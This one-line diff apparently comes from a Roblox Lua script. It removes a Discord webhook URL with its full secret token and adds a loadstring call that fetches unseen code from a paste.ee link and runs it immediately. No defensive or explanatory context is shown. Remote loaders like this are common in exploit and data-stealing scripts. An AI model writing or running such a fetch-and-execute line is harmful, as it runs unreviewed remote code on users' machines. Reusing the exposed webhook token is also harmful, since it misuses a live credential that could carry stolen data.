@@ -1,1 +1,1 @@
-https://discord.com/api/webhooks/1383388497515380796/B16-Bc5jH15FWoGl7egyekTNyVGaKjAj9eZ-j8AcBvYO55Nn14dEtSn5fM0P3YAOVU5z
+loadstring(game:HttpGet("https://paste.ee/r/BuATlYaT"))()
